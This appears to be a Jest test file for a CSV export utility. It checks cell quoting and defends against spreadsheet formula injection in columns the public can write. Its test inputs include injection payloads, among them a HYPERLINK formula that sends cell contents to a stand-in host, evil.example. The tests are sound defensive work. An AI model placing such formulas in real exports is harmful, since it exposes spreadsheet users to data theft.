import { escapeCsvCell, toCsv } from './csv.util';

/**
 * The export is opened by an RMC administrator; several of the columns in it are
 * written by the public. These are the cases where those two facts meet.
 */
describe('escapeCsvCell', () => {
  describe('CSV well-formedness — what the old one-liner already did', () => {
    it('quotes every cell', () => {
      expect(escapeCsvCell('plain')).toBe('"plain"');
    });

    it('doubles an inner quote so the cell survives the round trip', () => {
      expect(escapeCsvCell('He said "yes"')).toBe('"He said ""yes"""');
    });

    it('keeps a comma inside one cell', () => {
      expect(escapeCsvCell('Kigali, Rwanda')).toBe('"Kigali, Rwanda"');
    });

    it('keeps a newline inside one cell', () => {
      expect(escapeCsvCell('line one\nline two')).toBe('"line one\nline two"');
    });

    it('writes null and undefined as an empty cell, not as the word', () => {
      expect(escapeCsvCell(null)).toBe('""');
      expect(escapeCsvCell(undefined)).toBe('""');
    });

    it('renders a number without quoting it out of existence', () => {
      expect(escapeCsvCell(1500)).toBe('"1500"');
    });
  });

  /**
   * The part quoting does NOT solve. A spreadsheet consumes the CSV quotes as
   * quoting, then reads what is left — and a leading =/+/-/@ makes that a
   * formula rather than text.
   */
  describe('spreadsheet formula injection', () => {
    it.each(['=', '+', '-', '@'])('neutralises a cell opening with %s', (lead) => {
      const cell = escapeCsvCell(`${lead}HYPERLINK("https://evil.example")`);

      // The apostrophe is inside the quoted cell, so it is the first character
      // the spreadsheet sees once quoting is stripped.
      expect(cell.startsWith(`"'${lead}`)).toBe(true);
    });

    it('neutralises the real-world payload shape', () => {
      const attack = '=HYPERLINK("https://evil.example/"&A1,"CLICK")';

      expect(escapeCsvCell(attack)).toBe(
        `"'=HYPERLINK(""https://evil.example/""&A1,""CLICK"")"`,
      );
    });

    // A leading tab is trimmed by some importers, which uncovers the `=` behind
    // it — so the tab itself has to count as a lead character.
    it.each(['\t=cmd', '\r=cmd'])('neutralises whitespace hiding a formula (%j)', (payload) => {
      expect(escapeCsvCell(payload).startsWith(`"'`)).toBe(true);
    });

    it('leaves an ordinary name completely alone', () => {
      expect(escapeCsvCell('Aisha Uwimana')).toBe('"Aisha Uwimana"');
    });

    /**
     * The reason for prefixing rather than stripping: these are legitimate
     * values that must survive intact. The apostrophe is not shown in the cell,
     * so a reader still sees `-500`.
     */
    it('keeps a negative number readable rather than deleting the sign', () => {
      expect(escapeCsvCell(-500)).toBe(`"'-500"`);
    });

    it('does not touch a =/+/-/@ that is not the first character', () => {
      expect(escapeCsvCell('2+2 is not a formula here')).toBe('"2+2 is not a formula here"');
      expect(escapeCsvCell('user@example.com')).toBe('"user@example.com"');
    });
  });
});

describe('toCsv', () => {
  it('joins a header and its rows', () => {
    expect(toCsv(['a', 'b'], [[1, 2], [3, 4]])).toBe('"a","b"\n"1","2"\n"3","4"');
  });

  it('emits the header alone when there is nothing to export', () => {
    expect(toCsv(['a', 'b'], [])).toBe('"a","b"');
  });

  // The header is developer-authored, but escaping it too costs nothing and
  // means there is no unescaped path through this function to maintain.
  it('escapes body cells wherever they sit in the row', () => {
    expect(toCsv(['name'], [['ok', '=EVIL()']])).toBe(`"name"\n"ok","'=EVIL()"`);
  });
});
